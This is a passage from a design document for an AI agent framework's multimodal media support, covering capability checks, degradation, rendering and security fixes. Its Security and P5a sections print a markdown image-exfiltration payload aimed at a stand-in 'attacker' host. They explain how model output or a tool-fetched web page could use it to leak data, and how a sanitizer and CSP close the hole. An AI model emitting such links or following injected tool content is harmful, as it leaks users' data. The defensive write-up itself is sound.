Three projects, three declarations that describe more than they decide.

Three rules, adopted as acceptance criteria rather than as good intentions:

1. **Capabilities are consulted before the request, at one place.**
   `chatWithFallback` (`loop.ts:213`) gains a pre-flight adaptation step. That
   function currently treats every failure identically — its own comment says a
   4xx is a legitimate reason to try the next rung — which means a
   "this model has no eyes" 400 is today indistinguishable from a rate limit.
2. **A phase that adds a declaration also adds its consumer.** No phase lands a
   field whose only reader is a test.
3. **`supportsTools` gets fixed in the same wave**, because it is the same bug at
   the same seam, and leaving it as the counter-example next to new code invites
   the next person to copy it.

### Degradation

One ladder, applied by whoever is about to hand content to something narrower
than itself.

**To a model** (`media.onUnsupported`, default `degrade`):

1. Model accepts the mime type → send it. Inline in the tool result when
   `toolResultMedia: "inline"`.
2. `toolResultMedia: "follow-up"` → short text in the tool result, media in the
   next user turn, **prefixed with a marker naming the originating tool**. This
   is the position the Anthropic guidance warns about; the marker is what keeps
   the provenance visible to the model rather than laundering tool output into a
   user turn.

   Not invented here: the Vercel AI SDK's Google provider does exactly this for
   pre-Gemini-3 models — hoists the media to top-level parts and synthesizes a
   text part reading *"Tool executed successfully and returned this image as a
   response."* Same manoeuvre, same reason. Ours names the tool, because a
   marker that doesn't identify the source is not provenance.
3. Model has no eyes → replace the part with its text projection. Optionally
   enrich via OCR: `extract_document` already turns PDFs and images into text
   with `tesseract.js` / `pdf-parse`, both already optional deps. Off by default
   (`media.ocrFallback`), because OCR is slow and lossy and pretending a photo
   is its caption is its own kind of lie.

   This rung has exactly one shipped precedent in the industry, and it works the
   same way. OpenRouter's `file-parser` plugin converts a PDF for a model that
   can't take one — native if available, else an OCR engine — and its documented
   behaviour for the hardest case matches this ladder exactly: *"If your
   downstream model does not accept image input at all, OCR-extracted images are
   stripped entirely and only the parsed text is forwarded."* Convert first,
   strip last, never silently.
4. `onUnsupported: "skip-rung"` → don't degrade, try the next model in the
   chain. This is why the check belongs in `chatWithFallback` and not in the
   provider.

**To a surface:** inline → attachment → link → text projection. An HTML page
gets `<img>`; Discord and Slack get a file upload; a terminal gets
`[image: chart.png 1024×768 image/png #a1b2c3d4] file:///…`; a log gets the
projection alone.

Shipped as `renderForSurface()` in `core/src/channels/render.ts`, in **one**
implementation that every transport calls. That is not tidiness. Three
transports each applying the ladder themselves is three chances to decide that a
file too large to upload is a file not worth mentioning, and the two of them
that got it wrong would look exactly like the one that got it right — a message
that arrived. The function returns what to say *and* what to upload, so a
transport cannot take the bytes without also taking the decision about what to
do when it can't.

Every rung is lossy in a different direction, so each one says what it did. A
silently dropped image is the worst outcome available, and was the behaviour in
all four places named at the top.

**The rule that governs all of it: a part that does not reach the model must
leave either a warning or a placeholder. Never nothing, and never itself.**

The second half of that is not hypothetical. Read at source, the Vercel AI SDK
exhibits *four different* mismatch behaviours across its providers — silent
URL→bytes download, a hard `UnsupportedFunctionalityError`, warn-and-drop, and
**silent `JSON.stringify` of the output value**. The last one applies to its
OpenAI Chat Completions path and to its `openai-compatible` path, which
"doesn't even collect warnings" — so a base64 image is serialized into the
prompt as JSON text: thousands of tokens of noise, no image, no error, no log
line.

`openai_compatible` is TAI's built-in provider and the default for every local
gateway. That is precisely the path where the failure is quietest and the
budget damage is largest. So the adaptation step runs in `chatWithFallback`,
*before* any provider sees a part — a provider is never handed content it has
not declared it can carry, and no provider adapter is trusted to notice.

### Inbound

There is no inbound message type to extend. `IncomingMessage`
(`channels/interface.ts:1`) is exported and **never constructed by anything** —
all 17 `runAgentLoop` call sites pass a bare `string`, each channel having
flattened its own way.

```ts
export interface InboundMessage {
  text: string;
  /** Already stored — a caller puts bytes first and passes ids. */
  media?: MediaRef[];
}
export function runAgentLoop(
  userMessage: string | InboundMessage,
  opts: AgentLoopOptions,
): Promise<string>;
```

A union, so all 17 call sites compile untouched and each surface adopts the
richer form when it has something to put in it. `IncomingMessage` is either
given a body or deleted; leaving a decorative interface next to a real one is
how the next reader learns the wrong thing.

## Phases

Each ships alone and is useful alone.

**P1 — The content model. ✅ Shipped.** `ContentPart`, `MediaRef`,
`mediaKind`, `messageText`/`toolOutputText`, `MediaStore` + registry + disk
implementation, magic-byte type resolution, the `media` table and its retention
sweep. `Message.content` and `ToolResult.output` widened to their unions, the DB
codec, and the template sites the compiler could not catch. Nothing produces
media yet, so behaviour is unchanged.

The union experiment described above was run for real before committing to a
shape: a bare `ContentPart[]` arm produced **one** compile error in core, the
object arm produced **25**. 53 tests were added (core 3129 → 3182), including a
regression test asserting an image is not priced like its caption.
*Tier 1 (core).*

**P2 — Tools return media. ✅ Shipped.** MCP's `renderContent` stops flattening
and decodes `image`/`audio`/`resource` blocks into the store;
`screenshotMeta()` became `screenshot()` and returns the bytes it always
captured; `capToolResultOutput` caps text and never media; `hydrateMedia`
resolves references to bytes once per request so synchronous converters can
inline them; Anthropic emits `image`/`document` blocks **inside `tool_result`**
and Bedrock emits Converse `image` blocks in `toolResult.content`. Everything
else degrades to the placeholder.

A browser agent on Anthropic or Bedrock can now see what it screenshotted, and
an MCP server returning a chart hands over the chart. Chat Completions
deployments — the local path — still get the placeholder, which is correct
until P3 can tell a vision model from a text one.

**P3 — Capabilities. ✅ Shipped.** `ModelCapabilities` with object leaves and
the tri-state `"unknown"`; `AIProvider.capabilities(model)` as a function of the
model id; `ModelEntry.capabilities` per rung, winning over the provider; and the
pre-flight in `chatWithFallback` that degrades, skips a rung, or errors per
`MediaPolicy`. `supportsTools` was fixed in the same wave — it is now the
fallback for an undeclared `tools` capability and finally decides something.

Adaptation runs at the wire boundary and is never persisted, which is what makes
the `follow-up` rewrite safe: trimming and `stripOrphanedToolMessages` have
already run against the real history, so the synthesized user turn cannot be
split from the tool result it follows. That resolves the interaction flagged
under *What this breaks*.

**P4 — Inbound. ✅ Shipped (server + channels).** `InboundMessage` and the
`string | InboundMessage` union on `runAgentLoop`, so all seventeen call sites
compile untouched; `IncomingMessage` given a body and a `media` field rather
than left decorative. Discord downloads `attachments[]` (its URLs expire, so
they are fetched, not referenced); Slack downloads `files[]` **and its
file-only-message guard is fixed** — an uncaptioned image used to be dropped
before the agent existed. `POST /api/media` stores an upload and returns a
content-addressed ref, `GET /api/media/:id` serves it immutable and
`nosniff`-guarded, and `POST /api/chat` takes `mediaIds`.

Also shipped here, and overdue: **the store is finally constructed.** P1-P3
built the content model, the store, hydration and the capability pre-flight, and
nothing ever instantiated a store or handed one to the loop — the whole feature
worked only in tests. `media.*` config, `AgentRuntime.getMediaStore()` and the
`buildLoopOptions` wiring close that. It is the same failure mode as
`supportsTools`, and it is the reason `media-runtime-wiring.test.ts` exists.

Still open for P5: the UI composer (file / paste / drop) and rendering media
back out to a surface.

**P5a — Render surfaces: the web UI. ✅ Shipped.**
`renderMarkdown` is now the single place markdown becomes HTML, and it
sanitizes — the six call sites that piped `marked.parse()` straight into
`dangerouslySetInnerHTML` all go through it. The server sends a CSP whose
`img-src 'self' data:` is the part that matters. Images render inline in user,
assistant and **tool-result** bubbles; the composer takes files by picker, paste
and drop, uploading immediately so the send path stays JSON.

The two defences cover different things and neither is redundant. The sanitizer
stops scripts and event handlers, and still runs if a proxy strips the header.
The CSP stops a *remote image from loading at all*, which is the exfiltration
channel: `![](http://attacker/?q=…)` needs no JavaScript, so nothing about
script-blocking touches it.

Writing the sanitizer's tests caught a bug in the sanitizer itself: filtering
URLs by scheme applies to every attribute, so blocking remote images had also
stripped the `href` from every external link. Remote image sources are now
removed in a hook that can see the tag, and `https:` links work again. A link is
navigation the user chooses; an image `src` is an automatic fetch. Only the
second is the vector.

**P5b also fixed four coercion sites P1's sweep had missed**, found by auditing
the doc's own claims against the code rather than by anything failing. The worst
was live and user-visible: the stall detector built its round signature with
`results.map((r) => r.output).join("|")`, and `join` stringifies the `ToolOutput`
arm to `[object Object]` — so every media-carrying result compared equal to
every other, and a browser agent screenshotting two *different* pages was told it
was making no progress and had its screenshot tool taken away. The other three:
a rewind preview quoting encoded JSON at the user, cron pasting an encoded row
into the next prompt, and a workflow error message reading
`tool_call "x" failed: [object Object]`.

The lesson generalizes past this codebase. P1 swept for `${...}` because that is
the coercion everyone pictures; `.join()`, `String()`, and a raw
`SELECT content FROM messages` are the same hazard wearing different clothes, and
none of them is a compile error. Grep for the *operations* that coerce, not the
syntax that usually does.

**P5b — Outbound on the remaining surfaces. ✅ Shipped.** `Channel.send` and
`OutboundNotifier.send` take `string | MessageContent`; `SurfaceCapabilities` is
required on both; one shared `renderForSurface` owns the ladder; Discord uploads
through `files:` on the final text chunk, Slack posts text then
`files.uploadV2`, and the CLI prints a placeholder plus a `file://` path to
stderr so stdout stays exactly the answer.

Two things came out differently from the plan above, both for reasons worth
keeping.

*There is no `OutboundContent`.* The plan named one; it collapsed into the
existing `MessageContent`. A third content shape would have earned nothing and
cost something real — a flat `{ text, media[] }` cannot express "image, then the
question about it", and positional ordering is listed under *What other systems
do* as a constraint rather than a preference. Outbound content is content.

*The producer reads the record, not the return value.* Something has to decide
which media a reply carries, and the obvious move — widen `runAgentLoop` to
return `string | MessageContent` — would have churned eighteen call sites, most
of which only ever want text, to serve three surfaces. Instead `collectTurnMedia`
reads media out of the `messages` table written during the turn, bounded by a
watermark taken before it. That is the same source the web UI already renders
from, so a channel and the UI cannot disagree about what a turn produced, and it
is one fact in one place rather than the same fact travelling two ways. Only
`tool` and `assistant` rows are read, so an inbound photo is never echoed back
at the person who just sent it, and results dedupe by content hash — an agent
that screenshots an unchanged screen three times sends one file.

Terminal inline images were deliberately not attempted. iTerm2 and kitty both
have escape sequences for it, and emitting one to a terminal that does not
understand it dumps kilobytes of base64 into the user's scrollback. Detecting
support means sniffing `TERM_PROGRAM`, guessing wrong under multiplexers, and
owning that guess. It is a real feature and it is P6's.

**P6 — Optional, unscheduled.** OCR fallback; iTerm2 / kitty inline images in the
CLI; audio and video adapters; a resize step for models with small size caps.

Config (`media.store`, `media.dir`, `media.urlBase`, `media.retentionDays`,
`media.maxBytes`, `media.onUnsupported`, `media.onUnknown`, `media.options`) and
per-model capability declarations are *tier 3* — they live in a deployment's
`config.yaml`, not here. `media.ocrFallback` is named below under *Degradation*
and does **not** exist yet; it arrives with P6's OCR rung or not at all.

## Security

**The hole described in the next paragraph is closed** — `dompurify` is a UI
dependency and the server sets a CSP. Like *Why now*, the finding is kept in the
tense it was written in, because the argument for why it had to be fixed is
worth more than a sentence saying it was.

Media made an existing hole load-bearing, so P5 could not ship without closing
it.

**The UI rendered model output as `marked.parse()` into
`dangerouslySetInnerHTML`** — in `MessageBubble.tsx` and `chips.tsx`, among six
sites — with **no sanitizer in any package.json** and **no CSP anywhere in the
server**. So `![](http://attacker/?q=…)` written by a model — or by a web page a
tool fetched — already rendered, and already exfiltrated on load. That predated
the proposal, but the proposal makes agents emit images routinely, which turns a
latent bug into a used code path.

P5a shipped: a sanitizer on every `dangerouslySetInnerHTML` site, and a CSP with
`img-src 'self' data: blob:` so a remote image cannot phone home. `blob:` is
there for the composer's local preview of a file the user just picked, which is
same-origin by construction and never leaves the page.

Also required:

- **Resolve the mime type; never trust the declared one.** A client saying
  `image/png` over a 4 GB payload, or over HTML, decides nothing. Ladder, copied
  from the AI SDK's `resolveFullMediaType`: use a declared full type if present
  → otherwise sniff magic bytes → otherwise **fail with a message naming why**,
  rather than guessing. Note the AI SDK also *recovers* the media type from a
  data URL rather than trusting the part's own field, for the same reason.
- **Cap size and count before `put`**, not after.
- **Never let the server fetch a model-supplied URL** without going through the
  existing egress policy. `browser-mediator/egress-policy.ts` is the prior art.
  If a fetch path is added anyway, the AI SDK's built-in downloader is a ready
  checklist: validate redirects rather than following them blindly, enforce a
  hard byte ceiling (theirs is 100 MiB), and **cancel the response body on an
  error status** — their comment says why, *"so an error status from an
  attacker-controlled origin cannot leak open sockets."*
- Content addressing makes path traversal structurally impossible: the id is a
  hash, and a hash is never a path fragment the caller chose.

## What this breaks

Deliberately, and mostly at compile time. TAI has no external consumers of these
types, so a loud one-time break is the cheap option and a permanently awkward
API is the expensive one. The list below is what P1 signs up for.

Written before P1 and kept in that tense: it is the prediction, and the phases
above record what actually happened. Its line numbers are pre-P1 for the same
reason as the table further up. Every item here has since been done **except the
two named under *What is left*** — the SSE truncation, and `onToolResult`, which
was deliberately not widened once P5b removed the reason to.

- **Every read of `Message.content` and `ToolResult.output`** must decide what it
  does about media. 47 `Message.content` read sites repo-wide; ~40 fail to
  compile immediately, and the object-wrapped union converts most of the rest.
  Construction sites are untouched, since `string` stays in both unions.
- **Four sites the compiler will not catch**, because bare template
  interpolation of an object is legal TypeScript: `compact.ts:177`,
  `loop.ts:1673`, and two joins in `evals/`. They are listed here because a
  known finite list swept by hand is honest, and "the compiler has our back" is
  not. P1 fixes them explicitly and a test asserts `messageText` is used.
- **`onToolResult`'s signature**, and its seven consumers.
- **Token estimation is wrong for media.** `estimateTokens` is
  `content.length / 4`; image tokens are non-linear in bytes. A part's text
  projection is short, so the estimate *undercounts* badly, and undercounting
  makes the loop over-fill the window rather than under-fill it. P3 must add a
  per-part estimate — a declared per-image cost is enough to stop the estimate
  being a fiction. Note this one is *already* latent: under a bare
  `ContentPart[]` union it would have silently become "number of parts", which
  is how this design ended up object-wrapped.
- **Compaction sees text, not images.** `compactSession` builds a text
  transcript; a compacted conversation loses its pictures. Correct for now
  (summarizing images is a different feature) but it means compaction is
  irreversibly lossy in a new way, and the tombstone work in
  `docs/context-assembly-design.md` step 3 should land first if that matters.
- **The SSE `tool_result` event truncates to 1000 chars**, at two separate call
  sites (`packages/server/src/index.ts:1178` and `:2447`). Fine for a projection,
  wrong for parts — P5 sends refs over SSE, never bytes, and must fix both.
- **`stripOrphanedToolMessages` and the follow-up-user-message strategy
  interact.** A tool-result image promoted to a user turn is a message with no
  `tool_call_id`, sitting between a tool result and the next assistant turn.
  Eviction must treat the pair atomically or the image outlives its context.
  P3 owns this.

## Settled by building it

Questions this document asked and the implementation answered. Recorded rather
than deleted, because the answer is usually less interesting than the reason.

- **Does `parts` go in a new `messages.parts` TEXT column, or a `message_parts`
  table?** *Neither.* The existing `messages.content` column carries both arms:
  plain strings verbatim, media-carrying content JSON-encoded, decoding
  validated strictly enough that a legacy message whose text merely looks like
  JSON is not misread. No `ALTER TABLE`, no migration, and the live deployment's
  2000+ sessions never had to be touched.

  The half of the question that was really about retention dissolved rather than
  being answered. A `message_parts` table was wanted so "which sessions
  reference this blob" could be a query instead of a scan — but the sweep asks a
  different question than the one anticipated. Each `media` row carries
  `last_seen_at`, refreshed on every put of the same content, so
  `findExpiredMedia` selects on "unused since" with a `LIMIT`, and never walks
  the message history at all. Content addressing is what makes that work: a
  re-put of identical bytes is the same row, so re-use keeps a blob alive
  without anything counting references to it.
- **Is `media.onUnsupported: "degrade"` the right default?** *Yes, kept.* Both
  alternatives stayed reachable — `skip-rung` for someone who would rather empty
  a fallback chain than send a blinded request, `error` for someone who wants it
  loud — and degrading still announces itself, so the misconfiguration it hides
  is visible in the logs rather than silent.
- **How does an agent express "send this image out"?** *It does not.* The
  runtime reads what the turn produced out of the message record. Every
  alternative involved the model naming a media id in its text, which is
  reconstruction-by-regex over model-authored output, and this document already
  argues against that under *On `<image:abc>` placeholders*. A placeholder is a
  rendering, never a transport — including on the way out.

## Open questions

- **Should `structured` be sent to the model at all?** MCP servers that set
  `outputSchema` expect the client to show the model *something* structured.
  Serializing it into the text projection is the obvious answer and may be the
  wrong one.
- **Do rooms carry media?** `room_messages.content` is TEXT and the envelope is
  regex-parsed (`rooms/envelope.ts`). Agent-to-agent images are a real use case
  and a bigger change than it looks.
- **Where do capability defaults come from?** The *default* half is settled:
  `"unknown"` plus `media.onUnknown: "try"` is what shipped, and it is why an
  undeclared vision model still gets shown pictures. What stays open is whether
  to source real declarations from somewhere, and from where. Three options,
  none free:
  `models.dev`'s `api.json` (`modalities: {input:[], output:[]}` per model — it
  is what LangChain's profiles are generated from, so it is already load-bearing
  for someone else); OpenRouter's `/api/v1/models`, which is live and filterable
  by `input_modalities` but only covers models it routes; or shipping a small
  static table for the handful of models a default install actually names.
  A bundled table goes stale silently, which is the failure mode this document
  keeps arguing against — so probably: `"unknown"` plus a good `onUnknown`
  default, and a table only if that proves annoying in practice.
- **Do parts need their own provider-options bag?** The AI SDK puts
  `providerOptions` on *every* part, and two real features need it: OpenAI's
  `imageDetail: 'low'` (a large cost lever on image input) and Anthropic's
  `cacheControl` on a tool-result part. TAI's `providerExtra` exists only at the
  rung level, so neither is expressible. Not needed for P1–P5; likely needed the
  first time someone pays for full-detail screenshots in a loop.
- **If we ever upload to a provider's Files API, the cache key must include the
  provider.** v7 of the AI SDK deprecated its single `file-id` variants for a
  map (`{openai: 'file-abc', anthropic: 'file-xyz'}`) precisely because one id
  left the runtime guessing whose it was. A `MediaRef` gaining a
  `providerIds?: Record<string, string>` is the shape to copy, not a bare
  `remoteId`. Nothing in P1–P6 uploads, so this stays a note.
- **Should a denied approval be its own tool-output arm?** The AI SDK's
  `ToolResultOutput` has six arms, one of them `execution-denied`, for
  human-in-the-loop refusals. TAI has an approval system (`approvalHandler`,
  `request-action`) that currently expresses a denial as ordinary failure text.
  Orthogonal to media, but it is the same union, and widening it twice would be
  a shame.
